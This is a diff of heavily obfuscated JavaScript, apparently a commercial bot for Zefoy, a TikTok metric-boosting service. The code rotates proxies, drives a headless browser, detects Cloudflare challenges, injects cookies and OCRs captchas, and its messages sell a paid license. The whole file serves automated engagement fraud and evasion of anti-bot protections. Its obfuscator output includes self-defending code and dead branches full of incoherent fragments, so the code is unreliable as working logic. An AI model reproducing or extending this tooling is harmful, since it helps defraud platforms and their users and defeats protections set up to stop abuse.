-        aVwyc: v344.senEj
-      };
-      return new v346((p1091, p1092) => {
-        v345.recognize(S, v345.aVwyc).then(({
-          data: {
-            text: B
-          }
-        }) => {
-          v345.HcKXI(p1091, B);
-        });
-      });
+  if (v347.qPXUX(!v28, !v31)) {
+    if (v347.uRbNZ(v347.DdrDU, v347.GeZcD)) {
+      v347.stdout.moveCursor(0, -9);
+      vV43.stdout.clearScreenDown();
     } else {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v67 + "  Check proxies...");
+      process.stdout.write(v65 + "  Check proxies...");
     }
-  } else if (v344.cRweB(v344.MWkYH, v344.HFmko)) {
-    v344.TYaTI(f53, "Check proxies...");
+  } else if (v347.LVWgv(v347.MXIOB, v347.ROVEX)) {
+    p1142.log("Cloudflare Expired / Zefoy Expired");
+    return false;
   } else {
-    v344.aaAWZ(vV45, v346);
+    v347.JucqP(f54, "Check proxies...");
   }
-  let vV45 = v45;
-  const v346 = a0zd.readFileSync(v46, v344.nKHGE).split("\n");
-  const v347 = v346.sort((p1093, p1094) => 0.5 - Math.random());
-  for (let v348 = 0; v344.pwIJI(v348, v347.length); v348++) {
-    if (v344.bBfJv(v344.mWhIP, v344.mWhIP)) {
-      v344.aaAWZ(v344, "Check proxies...");
+  let vV43 = v43;
+  const v348 = a0ic.readFileSync(v44, v347.KvPfP).split("\n");
+  const v349 = v348.sort((p1242, p1243) => 0.5 - Math.random());
+  for (let v350 = 0; v347.FDLCB(v350, v349.length); v350++) {
+    if (v347.tKFgb(v347.TVagN, v347.TVagN)) {
+      D.stdout.moveCursor(0, -3);
+      l.stdout.clearScreenDown();
+      M.stdout.write("\n" + q + "[33m " + o + " [34m[" + L + "][0m " + T + "  [90m(" + v347.JQHQD(Q) + " /hr " + v347.YFRgh(v347.XKwqH(y), 60).toFixed(2) + " hrs)[0m\n\n");
+      R.stdout.write(e + " Running: Trying again (ERROR: " + h.substring(0, 22) + ")...");
     } else {
-      vV45 = v347[v348].trim();
-      if (v47 && !v47.split(",").includes(await v344.TCUTi(f49, vV45))) {
-        if (v344.cRweB(v344.dJRHc, v344.oSuXN)) {
-          continue;
+      vV43 = v349[v350].trim();
+      if (v45 && !v45.split(",").includes(await v347.LevvY(f50, vV43))) {
+        if (v347.GBVQc(v347.VeEUW, v347.VeEUW)) {
+          let v351 = v347.KJNAa(v347, vV43);
+          return v351.map(p1244 => {
+            let v352 = "";
+            for (let v353 = 0; v347.wRfTa(v353, p1244.length); v353 += 2) {
+              v352 += p1244[v353];
+            }
+            return v352.split("").reverse().join("");
+          });
         } else {
-          return v344.aaAWZ(v347, v344.umYxl(N, v344.aaAWZ(C, v348)));
+          continue;
         }
       }
-      if (vV45 && !v81.includes(vV45)) {
-        if (v344.YGkAd(v344.OpmJN, v344.igpvn)) {
-          let v349 = v344.split("");
-          for (let v350 = 0; v344.wSQLj(v350, v349.length); v350 += 2) {
-            if (v344.pwIJI(v344.mKKkB(v350, 1), v349.length)) {
-              let v351 = v349[v350];
-              v349[v350] = v349[v344.NSvtU(v350, 1)];
-              v349[v344.YdqfS(v350, 1)] = v351;
-            }
-          }
-          return v349.join("");
-        } else {
+      if (vV43 && !v79.includes(vV43)) {
+        if (v347.SDRBq(v347.IFvrh, v347.urNbh)) {
           try {
-            if (v344.YGkAd(v344.AGgrm, v344.lxOUp)) {
-              v344.umYxl(v348, "[" + t + "] " + V + " (+" + I + ") " + U);
-              v344.aaAWZ(B, r);
-            } else {
-              if (v344.lvVKL(!v26, !v29)) {
-                if (v344.doRGm(v344.OpSlY, v344.OpSlY)) {
-                  let v352 = await v344.umYxl(f49, vV45);
+            if (v347.LVWgv(v347.hDLrK, v347.hDLrK)) {
+              if (v347.qPXUX(!v28, !v31)) {
+                if (v347.vAYSC(v347.WqzMp, v347.WqzMp)) {
+                  let v354 = "";
+                  for (let v355 = 0; v347.wRfTa(v355, v354.length); v355 += 2) {
+                    let v356 = v347.QnQIG(v347.GxggX(o, L.substr(v355, 2), 16), 127);
+                    v354 += T.fromCharCode(v356);
+                  }
+                  let v357 = v347.SQBEG(C, v354);
+                  return J.parse(v357);
+                } else {
+                  let v358 = await v347.TbQkD(f50, vV43);
                   process.stdout.clearLine(0);
                   process.stdout.cursorTo(0);
-                  process.stdout.write(v67 + "  Check Proxy: " + vV45 + " [" + v352 + "]");
-                } else {
-                  v344 = true;
+                  process.stdout.write(v65 + "  Check Proxy: " + vV43 + " [" + v358 + "]");
                 }
-              } else if (v344.tMnJm(v344.zJExF, v344.BNHrX)) {
-                let v353 = await v344.TCUTi(f49, vV45);
-                v344.IkSpr(f53, "Check Proxy: " + vV45 + " [" + v353 + "]");
+              } else if (v347.apBjx(v347.IQhov, v347.IUFfK)) {
+                v347.SQBEG(p1142, "Launch Zefoy in headless browser...");
               } else {
-                v344.log("Cloudflare Valid / Zefoy Valid");
+                let v359 = await v347.IcIpB(f50, vV43);
+                v347.CfCnT(f54, "Check Proxy: " + vV43 + " [" + v359 + "]");
               }
-              if (await v344.NWJOY(f39, vV45, p1015)) {
-                if (v344.doRGm(v344.EbptA, v344.AQeQE)) {
-                  let v354 = [];
-                  for (let v355 = 0; v344.pwIJI(v355, v347.length); v355 += 64) {
-                    v354.push(C.slice(v355, v344.YFLfR(v355, 64)));
-                  }
-                  return v354;
+              if (await v347.PLQcQ(f40, vV43, p1142)) {
+                if (v347.zATlI(v347.oOMjR, v347.oOMjR)) {
+                  const v360 = z ? function () {
+                    if (v360) {
+                      const v361 = v360.apply(L, arguments);
+                      T = null;
+                      return v361;
+                    }
+                  } : function () {};
+                  J = false;
+                  return v360;
                 } else {
-                  if (v344.pqoEN(!v26, !v29)) {
-                    if (v344.XGRoG(v344.zRSMl, v344.HJzLX)) {
-                      let v356 = await v344.umYxl(f49, vV45);
+                  if (v347.qPXUX(!v28, !v31)) {
+                    if (v347.SDRBq(v347.mCLhU, v347.shXEM)) {
+                      let v362 = await v347.tbQjg(f50, vV43);
                       process.stdout.clearLine(0);
                       process.stdout.cursorTo(0);
-                      process.stdout.write(v61 + " Proxy: " + vV45 + " [" + v356 + "] works!");
+                      process.stdout.write(v59 + " Proxy: " + vV43 + " [" + v362 + "] works!");
                     } else {
-                      return false;
+                      v347.stdout.moveCursor(0, -2);
+                      vV43.stdout.clearScreenDown();
                     }
-                  } else if (v344.tMnJm(v344.oPdkj, v344.oPdkj)) {
-                    return true;
+                  } else if (v347.LVWgv(v347.MpNqR, v347.PxXXP)) {
+                    p1142.log("Cloudflare Expired / Freer Expired");
+                    return false;
                   } else {
-                    let v357 = await v344.IwMrz(f49, vV45);
-                    v344.IwMrz(f53, "Proxy: " + vV45 + " [" + v357 + "] works!");
+                    let v363 = await v347.RdCSY(f50, vV43);
+                    v347.yZGcL(f54, "Proxy: " + vV43 + " [" + v363 + "] works!");
                   }
                   break;
                 }
-              } else if (v344.estUU(v344.kPQBX, v344.MJQdD)) {
-                v347.stdout.clearLine(0);
-                N.stdout.cursorTo(0);
-                C.stdout.write(v348 + " Zefoy is protected by UAM Cloudflare!");
-              } else {
-                v81.push(vV45);
-                if (v344.lvVKL(!v26, !v29)) {
-                  if (v344.HDcZM(v344.iBCwT, v344.iBCwT)) {
-                    let v358 = await v344.EDXfT(f49, vV45);
+              } else if (v347.SDRBq(v347.zbNmr, v347.BUbAW)) {
+                v79.push(vV43);
+                if (v347.qPXUX(!v28, !v31)) {
+                  if (v347.gCbrI(v347.iPDyb, v347.UEFCb)) {
+                    let v364 = await v347.ehcgI(f50, vV43);
                     process.stdout.clearLine(0);
                     process.stdout.cursorTo(0);
-                    process.stdout.write(v62 + " Proxy: " + vV45 + " [" + v358 + "] failed!");
+                    process.stdout.write(v60 + " Proxy: " + vV43 + " [" + v364 + "] failed!");
                   } else {
-                    v344.IkSpr(vV45, v346);
-                    return null;
+                    v349.stdout.clearLine(0);
+                    z.stdout.cursorTo(0);
+                    w.stdout.write(v350 + " Wrong captcha! (" + p + ")");
                   }
-                } else if (v344.JsdmJ(v344.NeIFH, v344.gfSgV)) {
-                  v344.IkSpr(vV45, v346);
-                  return null;
+                } else if (v347.GBVQc(v347.WGRfJ, v347.WGRfJ)) {
+                  v347.pzoiN(p1142, "Continue without using proxy!");
                 } else {
-                  let v359 = await v344.IkSpr(f49, vV45);
-                  v344.TCUTi(f53, "Proxy: " + vV45 + " [" + v359 + "] failed!");
+                  let v365 = await v347.KJNAa(f50, vV43);
+                  v347.pkjco(f54, "Proxy: " + vV43 + " [" + v365 + "] failed!");
                 }
+              } else {
+                const v366 = {
+                  clPrn: function (p1245, p1246) {
+                    return v347.KJNAa(p1245, p1246);
+                  },
+                  xQUeH: v347.zcFwC
+                };
+                return new vV43((p1247, p1248) => {
+                  z.recognize(w, v366.xQUeH).then(({
+                    data: {
+                      text: r
+                    }
+                  }) => {
+                    v366.clPrn(p1247, r);
+                  });
+                });
               }
-              await v344.TYaTI(f52, 300);
+              await v347.SQBEG(f53, 300);
+            } else {
+              const v367 = v347.yZGcL(v347, vV43);
+              if (!v367.ok) {
+                return null;
+              }
+              const v368 = v367.text();
+              return v368;
             }
-          } catch (o) {
-            if (v344.bBfJv(v344.nQMdA, v344.BMEQn)) {
-              v81.push(vV45);
-              if (v344.pqoEN(!v26, !v29)) {
-                if (v344.bTiKt(v344.sOUSy, v344.OJNkR)) {
-                  let v360 = await v344.EDXfT(f49, vV45);
+          } catch (G) {
+            if (v347.sJJVV(v347.MasOA, v347.MasOA)) {
+              v347.SQBEG(D, "[" + l + "] " + M + " (+" + q + ") [" + o + "] Stopped for not accumulating the defined minimum! (in " + v347.VpDHQ(L) + " mins)");
+              if (!T) {
+                B.stdout.clearLine(0);
+                v.stdout.cursorTo(0);
+                G.stdout.write(Y + " Stopped for not accumulating the defined minimum!");
+              }
+              h.exit(0);
+            } else {
+              v79.push(vV43);
+              if (v347.QGFxO(!v28, !v31)) {
+                if (v347.Grvgf(v347.bURhQ, v347.bURhQ)) {
+                  const [, v369, v370, v371, v372, v373, v374, v375] = v350;
+                  return {
+                    followerCount: v347.yZGcL(p, v369),
+                    followingCount: v347.KJNAa(C, v370),
+                    heart: v347.yZGcL(J, v371),
+                    heartCount: v347.KJNAa(D, v372),
+                    videoCount: v347.HXnjU(l, v373),
+                    diggCount: v347.aNDAR(M, v374),
+                    friendCount: v347.ZKuGP(q, v375)
+                  };
+                } else {
+                  let v376 = await v347.KPiHx(f50, vV43);
                   process.stdout.clearLine(0);
                   process.stdout.cursorTo(0);
-                  process.stdout.write(v67 + "  Proxy: " + vV45 + " [" + v360 + "] failed: " + o.code);
-                } else {
-                  v344.log("\n\n");
+                  process.stdout.write(v65 + "  Proxy: " + vV43 + " [" + v376 + "] failed: " + G.code);
                 }
-              } else if (v344.tMnJm(v344.QpXsD, v344.QpXsD)) {
-                B.stdout.moveCursor(0, -3);
-                r.stdout.clearScreenDown();
-                J.stdout.write("\n" + A + "[33m " + F + " [34m[" + p + "][0m " + h + "  [90m(" + v344.DrNID(g) + " /hr " + v344.msctG(v344.tTcQD(T), 60).toFixed(2) + " hrs)[0m\n\n");
-                s.stdout.write(H + " Running: " + u.substring(0, 43));
+              } else if (v347.TptAN(v347.xmdfp, v347.xmdfp)) {
+                return v347.KPiHx(v347, vV43.split("").reverse().join(""));
               } else {
-                let v361 = await v344.umYxl(f49, vV45);
-                v344.TYaTI(f53, "Proxy: " + vV45 + " [" + v361 + "] failed: " + o.code);
+                let v377 = await v347.JucqP(f50, vV43);
+                v347.KPiHx(f54, "Proxy: " + vV43 + " [" + v377 + "] failed: " + G.code);
               }
-            } else {
-              v347.stdout.clearLine(0);
-              N.stdout.cursorTo(0);
-              C.stdout.write(v348 + " Stopped for not accumulating the defined minimum!");
             }
           }
+        } else if (v347.OSzuJ(z, 0)) {
+          D = l;
+        } else {
+          M = v347.aolYc(q, o);
         }
       }
     }
   }
-  if (v344.pqoEN(!v26, !v29)) {
-    if (v344.HDcZM(v344.GRRQv, v344.GRRQv)) {
-      let v362 = await v344.jPBrb(f49, vV45);
+  if (v347.QGFxO(!v28, !v31)) {
+    if (v347.sJJVV(v347.kLzra, v347.kLzra)) {
+      return {
+        username: p[1],
+        comment: C[2],
+        timestamp: J[3],
+        likes: v347.wXNRp(D, l[4].replace(/[,\.]/g, "")),
+        concat: "@" + M[1] + " \"" + q[2].substring(0, 10) + "...\" " + o[3] + " (" + L[4] + ")"
+      };
+    } else {
+      let v378 = await v347.vdVeW(f50, vV43);
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v67 + "  Trying Proxy: " + vV45 + " [" + v362 + "]");
-      await v344.aaAWZ(f52, 300);
-    } else {
-      v344.umYxl(B, "[" + r + "] " + J + " (+" + A + ") [" + F + "] Stopped for not accumulating the defined minimum! (in " + v344.tTcQD(p) + " mins)");
-      if (!h) {
-        W.stdout.clearLine(0);
-        R.stdout.cursorTo(0);
-        o.stdout.write(E + " Stopped for not accumulating the defined minimum!");
-      }
-      u.exit(0);
+      process.stdout.write(v65 + "  Trying Proxy: " + vV43 + " [" + v378 + "]");
+      await v347.tbQjg(f53, 300);
     }
-  } else if (v344.TGzTp(v344.FziUd, v344.xHUKb)) {
-    let v363 = await v344.QmFOe(f49, vV45);
-    v344.aaAWZ(f53, "Trying Proxy: " + vV45 + " [" + v363 + "]");
+  } else if (v347.apBjx(v347.YvIzt, v347.uBBXC)) {
+    return null;
   } else {
-    v347.stdout.clearLine(0);
-    N.stdout.cursorTo(0);
-    C.stdout.write(S + " Accumulation limit reached!");
+    let v379 = await v347.pkjco(f50, vV43);
+    v347.iLCNE(f54, "Trying Proxy: " + vV43 + " [" + v379 + "]");
   }
-  if (v344.eGfja(v81.length, v347.length)) {
-    if (v344.bTiKt(v344.Fvrcy, v344.Fvrcy)) {
-      let v364 = "";
-      for (let v365 = 0; v344.zRgQt(v365, v347.length); v365 += 2) {
-        v364 += C[v365];
-      }
-      return v364.split("").reverse().join("");
-    } else {
-      if (v344.pqoEN(!v26, !v29)) {
-        if (v344.XIBSM(v344.fhfVA, v344.fhfVA)) {
+  if (v347.ZSbYO(v79.length, v349.length)) {
+    if (v347.uRbNZ(v347.ldmTB, v347.ldmTB)) {
+      if (v347.qPXUX(!v28, !v31)) {
+        if (v347.apBjx(v347.TyAEM, v347.JQVgv)) {
+          p1142 = v347.WCBba;
+        } else {
           process.stdout.clearLine(0);
           process.stdout.cursorTo(0);
-          process.stdout.write(v67 + "  Continue without using proxy!");
-          await v344.jDWfg(f52, 300);
-        } else {
-          (function () {
-            return true;
-          }).constructor(dVnmym.lpfUn(dVnmym.KCPSE, dVnmym.fSFrn)).call(dVnmym.qxvRv);
+          process.stdout.write(v65 + "  Continue without using proxy!");
+          await v347.KJNAa(f53, 300);
         }
-      } else if (v344.doRGm(v344.gmxnI, v344.gmxnI)) {
-        v344.TCUTi(f53, "Continue without using proxy!");
+      } else if (v347.vAYSC(v347.nhaOn, v347.nhaOn)) {
+        v347.rkSIY(v347, vV43);
+        return null;
       } else {
-        v344.aaAWZ(vV45, "Cookies injected! (" + v346 + ")");
+        v347.DgdhF(f54, "Continue without using proxy!");
       }
-      return v45;
-    }
-  }
-  return vV45;
-}
-async function f39(p1095, p1096 = true) {
-  const v366 = {
-    IupQU: function (p1097, p1098) {
-      return p1097(p1098);
-    },
-    BapeG: function (p1099, p1100) {
-      return p1099 < p1100;
-    },
-    KRDqR: "--no-sandbox",
-    defXT: "--window-size=900,900",
-    RANZQ: "--window-position=200,0",
-    TTjFj: function (p1101, p1102) {
-      return p1101 + p1102;
-    },
-    tfsGN: "--user-agent=",
-    ZnMTb: "--proxy-server=",
-    fFzpg: function (p1103, p1104) {
-      return p1103 !== p1104;
-    },
-    RTFIj: "aXPSL",
-    ymhDh: "QDqSs",
-    KzaXF: "--disable-gpu",
-    Tjaca: "--disable-gpu-compositing",
-    lbctV: "browser-user",
-    qZMKd: function (p1105, p1106) {
-      return p1105 !== p1106;
-    },
-    MszEZ: "xWfZU",
-    nyIIc: "CmXyH",
-    bSCnJ: "domcontentloaded",
-    ZuFRI: function (p1107, p1108) {
-      return p1107 === p1108;
-    },
-    OhXeQ: "YWEwB",
-    XxZGW: function (p1109, p1110) {
-      return p1109 !== p1110;
-    },
-    QcqoE: "KvaRQ",
-    wKIZV: "LrQNR",
-    aVCLU: function (p1111, p1112) {
-      return p1111 !== p1112;
-    },
-    tEDRf: "Shupj",
-    kHJGl: "oipIf"
-  };
-  let v367 = [v366.KRDqR, v366.defXT, v366.RANZQ, v366.TTjFj(v366.tfsGN, v77), v366.TTjFj(v366.ZnMTb, p1095)];
-  if (v35) {
-    if (v366.fFzpg(v366.RTFIj, v366.ymhDh)) {
-      v367 = [...v367, v366.KzaXF, v366.Tjaca];
+      return v43;
     } else {
-      p1095.stdout.moveCursor(0, -1);
-      p1096.stdout.clearScreenDown();
+      let v380 = vV43.stringify(v348);
+      let v381 = v347.CfCnT(v349, v380);
+      let v382 = "";
+      for (let v383 = 0; v347.ottAr(v383, v381.length); v383++) {
+        let v384 = v347.wWBsN(v381.charCodeAt(v383), 127);
+        v382 += v384.toString(16).padStart(2, "0");
+      }
+      return v382;
     }
   }
-  const v368 = {
-    headless: p1096,
-    args: v367,
-    executablePath: vA0zS.browser,
-    userDataDir: vA0zS[v366.lbctV]
+  return vV43;
+}
+async function f40(p1249, p1250 = true) {
+  const v385 = {
+    lMPiZ: function (p1251, p1252) {
+      return p1251 + p1252;
+    },
+    RkmmG: "utf8",
+    tKWVt: "--no-sandbox",
+    pTksY: "--window-size=900,900",
+    bgraV: "--window-position=200,0",
+    lANKk: "--user-agent=",
+    rQqDv: function (p1253, p1254) {
+      return p1253 + p1254;
+    },
+    MsoKp: "--proxy-server=",
+    PvwtU: function (p1255, p1256) {
+      return p1255 === p1256;
+    },
+    ncUrn: "lhvZW",
+    NXdee: "PddIu",
+    oWQyp: "--disable-gpu",
+    gBVEI: "--disable-gpu-compositing",
+    JIEov: "browser-user",
+    jrUAh: function (p1257, p1258) {
+      return p1257 !== p1258;
+    },
+    bnesE: "KlcaY",
+    Wvrdi: "OSIqJ",
+    nGoHl: "domcontentloaded",
+    oOrRw: "QFyZg",
+    SvYBa: "wRtYk",
+    aUnYj: "JkhPB"
   };
-  const v369 = await a0zC.launch(v368);
+  const vV385 = v385;
+  let v386 = [vV385.tKWVt, vV385.pTksY, vV385.bgraV, vV385.lMPiZ(vV385.lANKk, v75), vV385.rQqDv(vV385.MsoKp, p1249)];
+  if (v33) {
+    if (vV385.PvwtU(vV385.ncUrn, vV385.NXdee)) {
+      return false;
+    } else {
+      v386 = [...v386, vV385.oWQyp, vV385.gBVEI];
+    }
+  }
+  const v387 = {
+    headless: p1250,
+    args: v386,
+    executablePath: vA0iw.browser,
+    userDataDir: vA0iw[vV385.JIEov]
+  };
+  const v388 = await a0iz.launch(v387);
   try {
-    if (v366.qZMKd(v366.MszEZ, v366.nyIIc)) {
-      const v370 = (await v369.pages())[0];
-      const v371 = {
+    if (vV385.jrUAh(vV385.bnesE, vV385.Wvrdi)) {
+      const v389 = (await v388.pages())[0];
+      const v390 = {
         timeout: 10000,
-        waitUntil: v366.bSCnJ
+        waitUntil: vV385.nGoHl
       };
-      await v370.goto(v92, v371);
-      const v372 = await v370.content();
-      if (/Zefoy/.test(v372) || /_cf_chl_opt/.test(v372)) {
-        if (v366.ZuFRI(v366.OhXeQ, v366.OhXeQ)) {
+      await v389.goto(v92, v390);
+      const v391 = await v389.content();
+      if (/Zefoy/.test(v391) || /_cf_chl_opt/.test(v391)) {
+        if (vV385.PvwtU(vV385.oOrRw, vV385.oOrRw)) {
           return true;
         } else {
-          return v371;
+          p1250.stdout.clearLine(0);
+          v385.stdout.cursorTo(0);
+          vV385.stdout.write(v386 + " The captcha is blocked and cannot be accessed!");
         }
       }
       return false;
     } else {
-      return v366.IupQU(v366, v366.IupQU(v367, v366.IupQU(v368, v369)));
+      const v392 = new v388().toLocaleString();
+      const v393 = "[" + v392 + "] [" + C?.substring(0, 26) + "...] [" + J + "] " + D;
+      if (l) {
+        T.appendFileSync(Q, vV385.lMPiZ(v393, "\n"), vV385.RkmmG);
+      }
+      if (v392) {
+        y.log(v393);
+      }
     }
-  } catch (J) {
-    if (v366.XxZGW(v366.QcqoE, v366.wKIZV)) {
+  } catch (o) {
+    if (vV385.PvwtU(vV385.SvYBa, vV385.SvYBa)) {
       return false;
     } else {
-      let v373 = v366.IupQU(p1095, p1096);
-      return v373.map(p1113 => {
-        let v374 = "";
-        for (let v375 = 0; v366.BapeG(v375, p1113.length); v375 += 2) {
-          v374 += p1113[v375];
-        }
-        return v374.split("").reverse().join("");
-      });
+      P.stdout.moveCursor(0, -1);
+      p1249.stdout.clearScreenDown();
     }
   } finally {
-    if (v366.aVCLU(v366.tEDRf, v366.kHJGl)) {
-      await v369.close();
+    if (vV385.jrUAh(vV385.aUnYj, vV385.aUnYj)) {
+      v385.stdout.clearLine(0);
+      vV385.stdout.cursorTo(0);
+      v386.stdout.write(v387 + " Cookies injected! (" + v388 + ")");
     } else {
-      return {
-        username: V[1],
-        comment: I[2],
-        timestamp: U[3],
-        likes: v366.IupQU(B, r[4].replace(/[,\.]/g, "")),
-        concat: "@" + J[1] + " \"" + A[2].substring(0, 10) + "...\" " + F[3] + " (" + p[4] + ")"
-      };
+      await v388.close();
     }
   }
 }
-async function f40() {
-  const v376 = {
-    whYdP: "You are using the FREE version limited to ~5000\n",
-    IYbEc: "accumulations. The advantage of acquiring the\n",
-    tYuRE: "license is that the bot continues to work\n",
-    vjuiO: "indefinitely and accumulates large amounts.\n",
-    jbycw: function (p1114, p1115) {
-      return p1114 + p1115;
+async function f41() {
+  const v394 = {
+    pSHRR: function (p1259, p1260) {
+      return p1259 || p1260;
     },
-    xtxTu: function (p1116, p1117) {
-      return p1116(p1117);
+    tFGTq: "(((.+)+)+)+$",
+    WsEjG: function (p1261, p1262) {
+      return p1261 === p1262;
     },
-    iFERn: function (p1118) {
-      return p1118();
+    gUyig: "Zefoy",
+    ZiREC: "Zefoy Tasks",
+    nebrb: "Freer Tasks",
+    LrRFT: function (p1263, p1264, p1265) {
+      return p1263(p1264, p1265);
     },
-    EGrBl: function (p1119, p1120) {
-      return p1119 / p1120;
+    CymkU: "...",
+    vqbSP: "--disable-gpu",
+    AqfPn: "--disable-gpu-compositing",
+    PdGAI: function (p1266, p1267) {
+      return p1266(p1267);
     },
-    LaYXy: "No comments found",
-    cXwWA: function (p1121, p1122) {
-      return p1121 === p1122;
+    gzBeX: function (p1268, p1269) {
+      return p1268 !== p1269;
     },
-    WBAnh: "tRCNZ",
-    RXZgv: function (p1123, p1124) {
-      return p1123 && p1124;
+    vrsbo: "ouymm",
+    tsGzV: "GwIaq",
+    aJoIT: function (p1270, p1271) {
+      return p1270 && p1271;
     },
-    BrhZt: function (p1125, p1126) {
-      return p1125 === p1126;
+    FXmSP: function (p1272, p1273) {
+      return p1272 !== p1273;
     },
-    Qcyjm: "pzCeC",
-    KgDUc: "NCvRN",
-    wjgZc: function (p1127, p1128) {
-      return p1127 === p1128;
+    EadSc: "Tagcb",
+    CzaJu: "MczKu",
+    qoncb: function (p1274, p1275) {
+      return p1274 !== p1275;
     },
-    ClMGU: "SgrQs",
-    bAMvN: function (p1129, p1130) {
-      return p1129(p1130);
+    xgNiF: "MMYOd",
+    bzala: function (p1276, p1277) {
+      return p1276(p1277);
     },
-    OCvRJ: function (p1131, p1132, p1133) {
-      return p1131(p1132, p1133);
+    cdCsr: "woikf",
+    UebjC: "dxdlp",
+    bCoKH: "KNglO",
+    XhlTT: function (p1278, p1279) {
+      return p1278(p1279);
     },
-    XeiTI: function (p1134, p1135) {
-      return p1134 !== p1135;
+    MzOIv: function (p1280, p1281) {
+      return p1280 !== p1281;
     },
-    cyQHu: "TmOAh",
-    gmXHz: function (p1136, p1137) {
-      return p1136 && p1137;
+    GEEtU: "zIlFt",
+    gsgXX: "ICghA",
+    TMEnk: function (p1282, p1283) {
+      return p1282(p1283);
     },
-    OPgxk: "hhJFD",
-    qEzHr: "OAIKz",
-    URzgh: function (p1138, p1139) {
-      return p1138(p1139);
+    lSFRy: function (p1284, p1285) {
+      return p1284 === p1285;
     },
-    WElJM: function (p1140, p1141) {
-      return p1140 === p1141;
+    hOovf: "QgSiP",
+    QphsZ: function (p1286, p1287) {
+      return p1286 === p1287;
     },
-    lZxtS: "NOQJj",
-    aMVOI: function (p1142, p1143) {
-      return p1142(p1143);
+    NsUYr: "GBcGV",
+    AIhtH: "ZVQjF",
+    oYoNs: function (p1288, p1289) {
+      return p1288 !== p1289;
     },
-    yRaty: function (p1144, p1145) {
-      return p1144(p1145);
+    nHDPK: "LqnDX",
+    KSsnZ: function (p1290, p1291) {
+      return p1290(p1291);
     },
-    rEJDH: "KYOeZ",
-    byfxn: "xrTFx",
-    QPJsU: function (p1146, p1147) {
-      return p1146 === p1147;
+    irXlu: function (p1292, p1293) {
+      return p1292 && p1293;
     },
-    GPGjL: "kklHW",
-    ofLGr: function (p1148, p1149) {
-      return p1148(p1149);
-    },
-    LyCcJ: function (p1150, p1151) {
-      return p1150 === p1151;
-    },
-    GCgaB: "WnDTY",
-    DkFKZ: function (p1152, p1153) {
-      return p1152(p1153);
-    },
-    KsIxo: function (p1154, p1155) {
-      return p1154(p1155);
-    },
-    eHotj: function (p1156, p1157) {
-      return p1156 !== p1157;
-    },
-    TeBsl: "uxutJ",
-    ThwQj: "ynrcx",
-    bBNYu: "CoEyw",
-    mDtXT: "harbU",
-    mupTD: "shTfO",
-    ABJiZ: "aNSPv"
+    qRHIf: "aCSxE",
+    IXexs: "lnIOS",
+    TBeWb: "pdBSq",
+    xpPnV: "jCItB",
+    pRtjk: function (p1294, p1295) {
+      return p1294(p1295);
+    }
   };
-  let vV452 = v45;
-  if (vV452) {
-    if (v376.cXwWA(v376.WBAnh, v376.WBAnh)) {
-      if (v376.RXZgv(!v26, !v29)) {
-        if (v376.BrhZt(v376.Qcyjm, v376.KgDUc)) {
-          if (/submit-captcha/.test(v)) {
-            C.log("Cloudflare Valid / Zefoy Expired");
-          } else {
-            S.log("Cloudflare Valid / Zefoy Valid");
-          }
-          return true;
-        } else {
+  let vV432 = v43;
+  if (vV432) {
+    if (v394.gzBeX(v394.vrsbo, v394.tsGzV)) {
+      if (v394.aJoIT(!v28, !v31)) {
+        if (v394.FXmSP(v394.EadSc, v394.CzaJu)) {
           process.stdout.clearLine(0);
           process.stdout.cursorTo(0);
-          process.stdout.write(v67 + "  Check proxies...");
+          process.stdout.write(v65 + "  Check proxies...");
+        } else {
+          c.stdout.moveCursor(0, v394.pSHRR(a, z) ? -18 : -19);
+          w.stdout.clearScreenDown();
         }
-      } else if (v376.wjgZc(v376.ClMGU, v376.ClMGU)) {
-        v376.bAMvN(f53, "Check proxies...");
+      } else if (v394.qoncb(v394.xgNiF, v394.xgNiF)) {
+        P.stdout.moveCursor(0, -6);
+        H.stdout.clearScreenDown();
       } else {
-        v.info("\n\n", v376.whYdP, v376.IYbEc, v376.tYuRE, v376.vjuiO, d + " Buy license in[35m " + N + "[0m\n");
+        v394.bzala(f54, "Check proxies...");
       }
-      await v376.bAMvN(f52, 300);
-      if (await v376.OCvRJ(f39, vV452, v28)) {
-        if (v376.XeiTI(v376.cyQHu, v376.cyQHu)) {
-          if (d) {
-            const v377 = t.apply(V, arguments);
-            I = null;
-            return v377;
-          }
-        } else if (v376.gmXHz(!v26, !v29)) {
-          if (v376.BrhZt(v376.OPgxk, v376.qEzHr)) {
-            y.log(v);
-            return false;
+      await v394.PdGAI(f53, 300);
+      if (await v394.LrRFT(f40, vV432, v30)) {
+        if (v394.qoncb(v394.cdCsr, v394.cdCsr)) {
+          return;
+        } else if (v394.aJoIT(!v28, !v31)) {
+          if (v394.WsEjG(v394.UebjC, v394.bCoKH)) {
+            vV432.log("Cloudflare Valid / Zefoy Expired");
           } else {
-            let v378 = await v376.URzgh(f49, vV452);
+            let v395 = await v394.XhlTT(f50, vV432);
             process.stdout.clearLine(0);
             process.stdout.cursorTo(0);
-            process.stdout.write(v67 + "  Proxy: " + vV452 + " [" + v378 + "] works!");
+            process.stdout.write(v65 + "  Proxy: " + vV432 + " [" + v395 + "] works!");
           }
-        } else if (v376.WElJM(v376.lZxtS, v376.lZxtS)) {
-          let v379 = await v376.aMVOI(f49, vV452);
-          v376.yRaty(f53, "Proxy: " + vV452 + " [" + v379 + "] works!");
+        } else if (v394.MzOIv(v394.GEEtU, v394.gsgXX)) {
+          let v396 = await v394.PdGAI(f50, vV432);
+          v394.TMEnk(f54, "Proxy: " + vV432 + " [" + v396 + "] works!");
         } else {
-          N.stdout.clearLine(0);
-          C.stdout.cursorTo(0);
-          S.stdout.write(v376.jbycw(t, " Check browser (" + V.substring(0, 34) + ")..."));
+          return P.toString().search(fuXIJp.tFGTq).toString().constructor(H).search(fuXIJp.tFGTq);
         }
-      } else if (v376.XeiTI(v376.rEJDH, v376.byfxn)) {
-        if (v376.gmXHz(!v26, !v29)) {
-          if (v376.QPJsU(v376.GPGjL, v376.GPGjL)) {
-            let v380 = await v376.ofLGr(f49, vV452);
+      } else if (v394.lSFRy(v394.hOovf, v394.hOovf)) {
+        if (v394.aJoIT(!v28, !v31)) {
+          if (v394.QphsZ(v394.NsUYr, v394.AIhtH)) {
+            if (v394.WsEjG(vV432.provider, v394.gUyig)) {
+              return v394.ZiREC;
+            } else {
+              return v394.nebrb;
+            }
+          } else {
+            let v397 = await v394.XhlTT(f50, vV432);
             process.stdout.clearLine(0);
             process.stdout.cursorTo(0);
-            process.stdout.write(v67 + "  Proxy: " + vV452 + " [" + v380 + "] failed!");
-          } else {
-            d.stdout.clearLine(0);
